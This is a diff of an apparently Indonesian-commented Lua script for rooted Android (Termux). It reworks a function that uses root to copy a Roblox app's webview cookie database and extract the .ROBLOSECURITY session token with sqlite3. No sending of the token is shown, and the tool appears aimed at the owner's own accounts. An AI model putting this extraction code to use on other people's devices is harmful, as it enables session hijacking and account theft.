@@ -1,7 +1,7 @@
 #!/usr/bin/env lua5.3
 
 -- ==========================================
--- CONFIGURATIONS
+-- CONFIGURATION
 -- ==========================================
 local MSRV_URL = "https://ghostbin.axel.org/paste/nk4fh/raw"
 local PLACE_ID = "121864768012064"
@@ -101,18 +101,45 @@ local function getPackages()
     return pkgs
 end
 
+local TERMUX_PREFIX = "/data/data/com.termux/files/usr/bin"
+local SQLITE_PATH = TERMUX_PREFIX .. "/sqlite3"
+
 local function getRobloxCookie(pkg)
-    local tempPath = "/sdcard/temp_cookie_" .. pkg .. "_" .. os.time() .. ".db"
-    execRoot("cp /data/data/" .. pkg .. "/app_webview/Default/Cookies " .. tempPath)
+    -- 1. Gunakan folder HOME termux, BUKAN /sdcard/ untuk menghindari masalah akses Android
+    local homeDir = os.getenv("HOME") or "/data/data/com.termux/files/home"
+    local tempPath = homeDir .. "/temp_cookie_" .. pkg .. ".db"
+    local sourcePath = "/data/data/" .. pkg .. "/app_webview/Default/Cookies"
+
+    -- 2. Salin database menggunakan root dan ubah izinnya agar bisa dibaca Termux biasa
+    local cpCmd = string.format("su -c 'cp \"%s\" \"%s\" && chmod 777 \"%s\"'", sourcePath, tempPath, tempPath)
+    os.execute(cpCmd)
+
+    -- 3. Eksekusi sqlite3 TANPA akses root
+    -- Ini mencegah error command not found dan error tanda kutip (escaping)
+    local query = "SELECT value FROM cookies WHERE name = '.ROBLOSECURITY' LIMIT 1"
+    local sqliteCmd = string.format('%s "%s" "%s"', SQLITE_PATH, tempPath, query)
     
-    local query = 'sqlite3 "' .. tempPath .. '" "SELECT value FROM cookies WHERE name = \\\'.ROBLOSECURITY\\\' LIMIT 1"'
-    local cookie = execRoot(query)
-    execRoot("rm " .. tempPath)
-    
+    local handle = io.popen(sqliteCmd)
+    local cookie = ""
+    if handle then
+        cookie = handle:read("*a")
+        handle:close()
+    end
+
+    -- 4. Hapus file sementara
+    os.execute(string.format("su -c 'rm \"%s\"'", tempPath))
+
+    -- 5. Bersihkan karakter enter/spasi yang terikut (Trim)
+    cookie = cookie:gsub("^%s*(.-)%s*$", "%1")
+
+    -- 6. Validasi dan Format
     if cookie and cookie ~= "" then
-        if cookie:sub(1,1) ~= "_" then cookie = "_" .. cookie end
+        if cookie:sub(1,1) ~= "_" then 
+            cookie = "_" .. cookie 
+        end
         return cookie
     end
+    
     return nil
 end
 
